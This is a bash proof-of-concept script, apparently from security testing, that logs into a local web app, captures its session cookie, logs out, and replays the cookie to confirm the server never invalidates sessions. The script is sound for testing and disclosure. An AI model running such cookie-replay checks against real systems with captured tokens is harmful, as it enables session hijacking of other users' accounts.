#!/bin/bash

# POC: Session Not Invalidated on Logout
# Demonstrates that session tokens remain valid after logout

TARGET="http://localhost:8082"
USERNAME="test"
PASSWORD="test"
USER_ID="10032"

echo "========================================"
echo "POC: Session Not Invalidated on Logout"
echo "========================================"
echo ""

# Step 1: Authenticate and capture session token
echo "[Step 1] Authenticating to get session token..."
LOGIN_RESPONSE=$(curl -i -s -X POST \
  -d "username=${USERNAME}&user_id=${USER_ID}&password=${PASSWORD}" \
  "${TARGET}/password/${USERNAME}")

# Extract session cookie
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | head -1 | sed 's/Set-Cookie: //i' | cut -d';' -f1 | tr -d '\r')

if [ -z "$SESSION_COOKIE" ]; then
  echo "[ERROR] Failed to obtain session cookie"
  exit 1
fi

echo "[SUCCESS] Obtained session: ${SESSION_COOKIE}"
echo ""

# Step 2: Verify session works before logout
echo "[Step 2] Testing session access to /dashboard BEFORE logout..."
DASHBOARD_BEFORE=$(curl -s -H "Cookie: ${SESSION_COOKIE}" "${TARGET}/dashboard")

if echo "$DASHBOARD_BEFORE" | grep -q "Welcome"; then
  USERNAME_FOUND=$(echo "$DASHBOARD_BEFORE" | grep -o "Welcome, [^<]*" | head -1)
  echo "[SUCCESS] Session valid - Dashboard shows: ${USERNAME_FOUND}"
else
  echo "[ERROR] Session not working before logout"
  exit 1
fi
echo ""

# Step 3: Logout
echo "[Step 3] Logging out..."
LOGOUT_RESPONSE=$(curl -i -s -X POST \
  -H "Cookie: ${SESSION_COOKIE}" \
  "${TARGET}/logout")

if echo "$LOGOUT_RESPONSE" | grep -q "HTTP.*302"; then
  echo "[SUCCESS] Logout request completed (HTTP 302 redirect)"
  
  # Check if logout attempts to expire cookie
  if echo "$LOGOUT_RESPONSE" | grep -qi "Expires=.*1970"; then
    echo "[INFO] Logout response includes cookie expiration header (client-side only)"
  fi
else
  echo "[WARNING] Unexpected logout response"
fi
echo ""

# Step 4: Test if session still works AFTER logout
echo "[Step 4] Testing if OLD session still works AFTER logout..."
DASHBOARD_AFTER=$(curl -s -H "Cookie: ${SESSION_COOKIE}" "${TARGET}/dashboard")

if echo "$DASHBOARD_AFTER" | grep -q "Welcome"; then
  USERNAME_FOUND=$(echo "$DASHBOARD_AFTER" | grep -o "Welcome, [^<]*" | head -1)
  echo "[CRITICAL VULNERABILITY CONFIRMED] Session STILL valid after logout!"
  echo "[CRITICAL] Dashboard still shows: ${USERNAME_FOUND}"
  echo "[CRITICAL] The session token was NOT invalidated server-side"
  echo ""
  echo "========================================"
  echo "VULNERABILITY CONFIRMED"
  echo "========================================"
  echo "The session token remains active after logout, allowing continued"
  echo "unauthorized access. An attacker who captured this token can"
  echo "continue using it even after the legitimate user has logged out."
  echo ""
  exit 0
else
  echo "[INFO] Session properly invalidated - Dashboard access denied"
  echo "[INFO] Vulnerability NOT present"
  exit 1
fi